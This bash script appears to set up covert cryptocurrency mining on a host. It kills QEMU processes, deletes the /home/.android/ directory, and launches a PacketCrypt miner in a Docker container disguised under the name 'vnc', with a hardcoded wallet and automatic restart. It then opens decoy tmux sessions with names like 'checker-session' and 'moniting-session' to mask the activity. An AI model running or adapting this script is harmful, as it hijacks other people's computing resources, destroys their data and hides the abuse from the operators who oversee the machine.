#!/bin/bash

pkill qemu-system-x86
rm -rf /home/.android/
docker run -d --name vnc --restart always -e WALLET=pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy thomasjp0x42/packetcrypt-amd64 ann -p pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy http://pool.pkt.world
tmux new -d -s checker-session 'tail -f /dev/null'
tmux new -d -s checkup-session 'cat'
tmux new -d -s moniting-session 'top'
tmux attach -t moniting-session
